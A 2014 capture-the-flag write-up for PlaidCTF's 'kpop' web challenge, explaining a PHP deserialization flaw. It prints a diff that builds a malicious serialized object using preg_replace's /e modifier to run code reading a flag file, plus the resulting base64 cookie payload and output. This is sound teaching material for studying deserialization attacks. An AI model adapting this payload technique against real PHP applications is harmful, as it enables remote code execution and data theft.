---
id: 1847
title: 'PlaidCTF writeup for Web-200 &#8211; kpop (bad deserialization)'
date: '2014-04-13T22:57:39-05:00'
author: 'Ron Bowes'
layout: post
guid: 'https://blog.skullsecurity.org/?p=1847'
permalink: /2014/plaidctf-writeup-for-web-200-kpop-bad-deserialization
categories:
    - Hacking
    - 'PlaidCTF 2014'
---

Hello again!

This is my second writeup from [PlaidCTF](http://www.plaidctf.com) this past weekend! It's for the Web level called kpop, and is about how to shoot yourself in the foot by misusing serialization ([download the files](https://blogdata.skullsecurity.org/kpop.tar.bz2)). There are at least three levels I either solved or worked on that involved serialization attacks ([mtpox](/2014/plaidctf-web-150-mtpox-hash-extension-attack), reeekeeeeee, and this one), which is awesome because this is a seriously undersung attack. Good on the PPP!

## Bad serialization

I'll start off with a quick summary of how vulnerable serialization happens, then will move onto specifics of this level.

Generally, when an attacker provides code for a service to deserialize, it's frequently bad news. Basically, at best, it lets an attacker provide values to protected and possibly private fields. At worst, it allows an attacker to control function pointers or overloaded operators that can lead directly to code execution.

In the case of PHP, you can't serialize functions, so it's harder to shoot yourself in the food. However, you *can* control private and protected fields, which is where this attack comes in.

## Class overload

There were so many classes with interdepencies, I got quickly overloaded. I'm really bad at visualizing programs. I ended up grabbing a whiteboard and going outside, where I produced this:

![](https://blogdata.skullsecurity.org/kpop-whiteboard.jpg)

In retrospect, that was way overkill, but it was nice to get some fresh air.

My goal was to find every variable in every class that got serialized, and to figure out every function in which it was used. I knew that both the Lyrics class and lyrics strings got deserialized, one from a cookie and the other from a POST argument, and I also knew that Lyric contained references to a bunch of other classes (see the diagram).

My goal was cut short when I noticed the preg\_replace() was being called with a string that I controlled via deserialization! I've many times told people to avoid putting attacker-controlled strings into a regular expression, because regular expressions do all kinds of crazy things. I headed over to [http://php.net/preg\_replace](http://php.net/preg_replace) and, sure enough, found this note:

```
The /e modifier is deprecated. Use preg_replace_callback() instead. See the PREG_REPLACE_EVAL documentation for additional information about security risks. 
```

And on a linked page:

```

e (PREG_REPLACE_EVAL)
<div style="background-color: #FFc0c0; color: #000000"><strong>Warning</strong> This feature has been DEPRECATED as of PHP 5.5.0. Relying on this feature is highly discouraged.</div>

If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string. ...
```

Beautiful, sounds like exactly what I want!

## Exploit

From there, I made a copy of classes.php called evil\_classes.php, with the following changes:

```

$ diff -ub classes.php evil_classes.php
<span class="Type">--- classes.php 2014-04-12 14:54:44.000000000 -0700</span>
<span class="Type">+++ evil_classes.php    2014-04-12 14:54:44.000000000 -0700</span>
<span class="Identifier">@@ -59,7 +59,7 @@</span>
   function __construct($name, $group, $url) {
     $this->name = $name; $this->group = $group;
     $this->url = $url;
<span class="Special">-    $fltr = new OutputFilter("/\[i\](.*)\[\/i\]/i", "<i>\\1</i>");</span>
<span class="Statement">+    $fltr = new OutputFilter("/.*/e", "print(file_get_contents('/home/flag/flag'))");</span>
     $this->logger = new Logger(new LogWriter_File("song_views", new LogFileFormat(array($fltr), "\n")));
   }
   function __toString() {
<span class="Identifier">@@ -92,6 +92,10 @@</span>
   }
 };

<span class="Statement">+$l = new Lyrics("lyrics", new Song("name", "group", "url"));</span>
<span class="Statement">+print(base64_encode(serialize($l)));</span>
<span class="Statement">+print("\n");</span>
<span class="Statement">+</span>
 class User {
   static function addLyrics($lyrics) {
     $oldlyrics = array();
```

Then I ran it, getting:

```
Tzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjY6Imx5cmljcyI7czo3OiIAKgBzb25nIjtPOjQ6IlNvbmciOjQ6e3M6OToiACoAbG9nZ2VyIjtPOjY6IkxvZ2dlciI6MTp7czoxMjoiACoAbG9nd3JpdGVyIjtPOjE0OiJMb2dXcml0ZXJfRmlsZSI6Mjp7czoxMToiACoAZmlsZW5hbWUiO3M6MTA6InNvbmdfdmlld3MiO3M6OToiACoAZm9ybWF0IjtPOjEzOiJMb2dGaWxlRm9ybWF0IjoyOntzOjEwOiIAKgBmaWx0ZXJzIjthOjE6e2k6MDtPOjEyOiJPdXRwdXRGaWx0ZXIiOjI6e3M6MTU6IgAqAG1hdGNoUGF0dGVybiI7czo1OiIvLiovZSI7czoxNDoiACoAcmVwbGFjZW1lbnQiO3M6NDM6InByaW50KGZpbGVfZ2V0X2NvbnRlbnRzKCcvaG9tZS9mbGFnL2ZsYWcnKSkiO319czo3OiIAKgBlbmRsIjtzOjE6IgoiO319fXM6NzoiACoAbmFtZSI7czo0OiJuYW1lIjtzOjg6IgAqAGdyb3VwIjtzOjU6Imdyb3VwIjtzOjY6IgAqAHVybCI7czozOiJ1cmwiO319
```

Before the base64, it looks like this:

```
O:6:"Lyrics":2:{s:9:"*lyrics";s:6:"lyrics";s:7:"*song";O:4:"Song":4:{s:9:"*logger";O:6:"Logger":1:{s:12:"*logwriter";O:14:"LogWriter_File":2:{s:11:"*filename";s:10:"song_views";s:9:"*format";O:13:"LogFileFormat":2:{s:10:"*filters";a:1:{i:0;O:12:"OutputFilter":2:{s:15:"*matchPattern";s:5:"/.*/e";s:14:"*replacement";s:43:"print(file_get_contents('/home/flag/flag'))";}}s:7:"*endl";s:1:"
";}}}s:7:"*name";s:4:"name";s:8:"*group";s:5:"group";s:6:"*url";s:3:"url";}}
```

Yup, our evil regular expression is there! Now we just set the 'lyrics' cookie to that (I like using [the Web developer](https://addons.mozilla.org/en-US/firefox/addon/web-developer/) addon for firefox), visit http://54.234.123.205/import.php (note: the address won't work after a couple days), hit 'enter' in the field, and watch the money roll in!

```

One_of_our_favorite_songs_is_bubble_pop
One_of_our_favorite_songs_is_bubble_pop
One_of_our_favorite_songs_is_bubble_pop
<span class="htmlTag"><</span><span class="htmlTagName">html</span><span class="htmlTag">></span>
  <span class="htmlTag"><</span><span class="htmlTagName">head</span><span class="htmlTag">></span>
<span class="PreProc">    </span><span class="htmlTag"><</span><span class="htmlTagName">title</span><span class="htmlTag">></span><span class="Title">The Plague's KPop Fan Page - Imported Songs</span><span class="htmlEndTag"></</span><span class="htmlTagName">title</span><span class="htmlEndTag">></span>
<span class="PreProc">  </span><span class="htmlEndTag"></</span><span class="htmlTagName">head</span><span class="htmlEndTag">></span>
  <span class="htmlTag"><</span><span class="htmlTagName">body</span><span class="htmlTag">></span>
    <span class="htmlTag"><</span><span class="htmlTagName">p</span><span class="htmlTag">></span>Your songs have been imported! Go back to the <span class="htmlTag"><</span><span class="htmlTagName">a</span><span class="htmlTag"> </span><span class="htmlArg">href</span><span class="htmlTag">=</span><span class="Constant">"songs.php"</span><span class="htmlTag">></span><span class="Underlined">songs</span><span class="htmlEndTag"></</span><span class="htmlTagName">a</span><span class="htmlEndTag">></span> page to see them!<span class="htmlEndTag"></</span><span class="htmlTagName">p</span><span class="htmlEndTag">></span>
  <span class="htmlEndTag"></</span><span class="htmlTagName">body</span><span class="htmlEndTag">></span>
<span class="htmlEndTag"></</span><span class="htmlTagName">html</span><span class="htmlEndTag">></span>
```